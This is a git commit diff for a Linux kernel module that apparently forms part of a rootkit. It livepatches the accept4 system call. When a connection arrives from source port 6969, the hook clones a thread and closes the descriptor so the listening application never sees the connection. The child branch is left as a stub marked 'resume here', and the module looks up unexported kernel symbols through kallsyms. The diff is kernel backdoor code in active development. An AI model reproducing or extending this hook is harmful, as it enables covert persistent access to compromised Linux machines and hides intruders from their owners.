796ca0d6b65529f06fd6b7d6c0edfb1f5857612b
unst4b13 <unst4b13@pm.me>
2023-10-18 16:39:36 +0000

    cloning and closing fd's

--- hooks/__sys_accept4.c
+++ hooks/__sys_accept4.c
@@ -3,15 +3,21 @@
 #include <linux/socket.h>
 #include <linux/file.h>
 #include <linux/livepatch.h>
+#include <uapi/linux/in.h>
+#include <linux/sched/task.h>
+#include <linux/fdtable.h>
 
 #include "include/fakekallsyms.h"
 
 int (*__sys_accept4_file_fp)(struct file *, unsigned, struct sockaddr __user *, int __user *, int, unsigned long);
+pid_t (*kernel_clone_fp)(struct kernel_clone_args *);
 
 int __sys_accept4_2(int fd, struct sockaddr __user *upeer_sockaddr, int __user *upeer_addrlen, int flags)
 {
 	int ret = -EBADF;
 	struct fd f;
+	struct sockaddr_in *addr_in;
+	struct kernel_clone_args args = { .exit_signal = 0x11 };
 	
 	f = fdget(fd);
 	if(f.file) {
@@ -19,7 +25,16 @@ int __sys_accept4_2(int fd, struct sockaddr __user *upeer_sockaddr, int __user *
 		fdput(f);	
 	}
 
-	pr_warn("__sysaccept4 hooked - here is your file descriptor -> %d\n", ret);
+	addr_in = (struct sockaddr_in *)upeer_sockaddr;
+	if(ntohs(addr_in->sin_port) == 6969) {
+		if(kernel_clone_fp(&args) == 0) {
+			//resume here
+		} else {
+			close_fd(ret);
+			return -1;	
+		}
+	} 
+
 	return ret;	
 }
 
@@ -44,9 +59,12 @@ struct klp_patch patch = {
 int init_module(void)
 {
 	const char *symbol = "__sys_accept4_file";
-	__sys_accept4_file_fp = (void *)kallsyms_lookup_name(symbol);
+	const char *symbol2 = "kernel_clone";
 
-	if(__sys_accept4_file_fp) {
+	__sys_accept4_file_fp = (void *)kallsyms_lookup_name(symbol);
+	kernel_clone_fp = (void *)kallsyms_lookup_name(symbol2);
+
+	if(__sys_accept4_file_fp && kernel_clone_fp) {
 		klp_enable_patch(&patch);	
 	} 
 
